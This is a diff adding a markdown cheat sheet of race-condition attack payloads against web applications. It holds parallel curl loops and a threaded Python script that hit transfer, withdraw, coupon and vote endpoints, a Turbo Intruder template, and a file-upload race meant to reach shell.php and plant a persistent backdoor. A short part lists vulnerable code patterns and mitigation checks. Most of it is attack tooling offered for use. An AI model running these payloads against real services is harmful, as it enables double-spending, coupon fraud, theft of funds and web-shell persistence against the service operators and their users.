@@ -1,0 +1,358 @@
+# Race Condition Payloads
+
+## ========================================
+## BASIC RACE CONDITION
+## ========================================
+
+# Send multiple simultaneous requests
+Request 1: POST /api/transfer?amount=100&to=attacker
+Request 2: POST /api/transfer?amount=100&to=attacker
+Request 3: POST /api/transfer?amount=100&to=attacker
+
+# Result: Transfer happens multiple times
+
+## ========================================
+## TIMING-BASED EXPLOITATION
+## ========================================
+
+# Exploit time window
+1. Check balance: $100
+2. Initiate transfer: $100
+3. Before check, initiate again: $100
+4. Both transfers complete
+
+## ========================================
+## CONCURRENT REQUESTS
+## ========================================
+
+# Parallel execution
+for i in {1..100}; do
+  curl -X POST http://target.com/api/redeem-coupon &
+done
+
+## ========================================
+## LIMIT BYPASS
+## ========================================
+
+# Bypass single-use restriction
+Parallel requests to use coupon multiple times
+
+# Bypass rate limiting
+Send requests simultaneously before limit kicks in
+
+## ========================================
+## DOUBLE SPENDING
+## ========================================
+
+# Spend same credits twice
+POST /api/purchase?item=1&credits=100 (x10 simultaneous)
+
+# Withdraw same balance
+POST /api/withdraw?amount=1000 (parallel requests)
+
+## ========================================
+## COUPON/VOUCHER ABUSE
+## ========================================
+
+# Redeem coupon multiple times
+for i in {1..50}; do
+  curl -X POST http://target.com/redeem -d "code=SAVE50" &
+done
+
+## ========================================
+## INVENTORY BYPASS
+## ========================================
+
+# Purchase more than available
+# Stock: 1 item
+POST /buy?product_id=1 (x10 parallel)
+# Result: Sold 10 items
+
+## ========================================
+## REGISTRATION RACE
+## ========================================
+
+# Register same username
+POST /register username=admin (parallel)
+# First one succeeds, exploit race window
+
+## ========================================
+## FILE UPLOAD RACE
+## ========================================
+
+# Upload malicious file
+1. Upload shell.php
+2. Access shell.php before it's deleted
+3. Create persistent backdoor
+
+## ========================================
+## VOTING/LIKE ABUSE
+## ========================================
+
+# Vote multiple times
+for i in {1..1000}; do
+  curl -X POST http://target.com/vote?id=1 &
+done
+
+## ========================================
+## TOOLS FOR EXPLOITATION
+## ========================================
+
+# Burp Suite Turbo Intruder
+1. Send request to Turbo Intruder
+2. Use race condition template
+3. Configure parallel threads
+4. Launch attack
+
+# Python script
+import requests
+import threading
+
+def exploit():
+    r = requests.post('http://target.com/api/transfer',
+                     data={'amount': 100, 'to': 'attacker'},
+                     cookies={'session': 'valid_session'})
+
+threads = []
+for i in range(50):
+    t = threading.Thread(target=exploit)
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+## ========================================
+## CURL PARALLEL REQUESTS
+## ========================================
+
+# Using xargs
+seq 1 100 | xargs -P 100 -I {} curl -X POST http://target.com/api/action
+
+# Using GNU parallel
+parallel -j 100 curl -X POST http://target.com/api/action ::: {1..100}
+
+## ========================================
+## BASH BACKGROUND JOBS
+## ========================================
+
+# Parallel curl
+for i in {1..100}; do
+  curl -X POST http://target.com/api/transfer \
+    -d "amount=100&to=attacker" \
+    -H "Cookie: session=valid" &
+done
+wait
+
+## ========================================
+## CRITICAL OPERATIONS TO TEST
+## ========================================
+
+# Money transfer
+POST /api/transfer
+
+# Coupon redemption
+POST /api/redeem
+
+# Voting
+POST /api/vote
+
+# Purchase
+POST /api/purchase
+
+# Password reset
+POST /api/reset-password
+
+# Account creation
+POST /api/register
+
+# File upload
+POST /api/upload
+
+## ========================================
+## TIME-OF-CHECK TO TIME-OF-USE (TOCTOU)
+## ========================================
+
+# Exploit window
+1. Check if user has enough balance
+2. [Race window here]
+3. Deduct balance
+
+# Attack in window
+Send multiple requests during check/use gap
+
+## ========================================
+## DATABASE TRANSACTION RACE
+## ========================================
+
+# Exploit missing transaction isolation
+1. Read balance: $100
+2. Calculate new: $0
+3. [Race window]
+4. Update balance: $0
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify critical operations
+- Transfers, purchases, redemptions
+
+# 2. Send parallel requests
+- Use Turbo Intruder or scripts
+
+# 3. Check for duplicates
+- Did operation happen multiple times?
+
+# 4. Vary timing
+- Adjust delays between requests
+
+# 5. Increase concurrency
+- More parallel threads
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Slowloris-style
+Keep connections open
+Send requests simultaneously
+
+# HTTP/2 single connection
+Send multiple requests over single connection
+
+## ========================================
+## REAL-WORLD EXAMPLES
+## ========================================
+
+# Example 1: Starbucks gift card
+Race condition allowed draining gift cards
+
+# Example 2: Bitcoin exchange
+Double withdrawal via race condition
+
+# Example 3: Gaming platform
+Duplicate in-game currency
+
+## ========================================
+## EXPLOITATION WORKFLOW
+## ========================================
+
+# Step 1: Intercept request
+Burp Suite → Intercept critical operation
+
+# Step 2: Send to Turbo Intruder
+Right-click → Extensions → Turbo Intruder
+
+# Step 3: Configure
+Set threads to 10-50
+Set requests to 100+
+
+# Step 4: Launch
+Start attack
+
+# Step 5: Analyze
+Check responses for success
+
+## ========================================
+## NODE.JS SPECIFIC
+## ========================================
+
+# Async race conditions
+async function vulnerable() {
+  let balance = await getBalance();
+  if (balance >= amount) {
+    await withdraw(amount);  // Race here
+  }
+}
+
+## ========================================
+## INDICATORS OF VULNERABILITY
+## ========================================
+
+# No transaction locking
+# No atomic operations
+# Check-then-use pattern
+# Missing synchronization
+# No idempotency keys
+
+## ========================================
+## BURP TURBO INTRUDER
+## ========================================
+
+# Template
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=10,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    
+    for i in range(100):
+        engine.queue(target.req)
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Test for:
+- [ ] Database row locking
+- [ ] Atomic operations
+- [ ] Idempotency keys
+- [ ] Transaction isolation
+- [ ] Request deduplication
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: Check then update
+if (user.balance >= amount) {
+  user.balance -= amount;  // Race window
+}
+
+# Pattern 2: Read-modify-write
+balance = get_balance();
+new_balance = balance - amount;
+update_balance(new_balance);  // Race
+
+# Pattern 3: Async operations
+async check + async update
+
+## ========================================
+## SPECIFIC ATTACK SCENARIOS
+## ========================================
+
+# Scenario 1: Limited offers
+"First 100 users get discount"
+Race to claim multiple times
+
+# Scenario 2: Referral bonuses
+Create multiple accounts simultaneously
+
+# Scenario 3: Token generation
+Generate multiple tokens in parallel
+
+# Scenario 4: File processing
+Upload → Process → Delete
+Access during processing
+
+## ========================================
+## AUTOMATED TOOLS
+## ========================================
+
+# Race The Web
+https://github.com/TheHackersLabs/RaceTheWeb
+
+# Racepwn
+Custom race condition tester
+
+## ========================================
+## VERIFICATION
+## ========================================
+
+# After attack, check:
+- Database for duplicates
+- Transaction logs
+- Account balance
+- Inventory levels
+- Coupon usage count
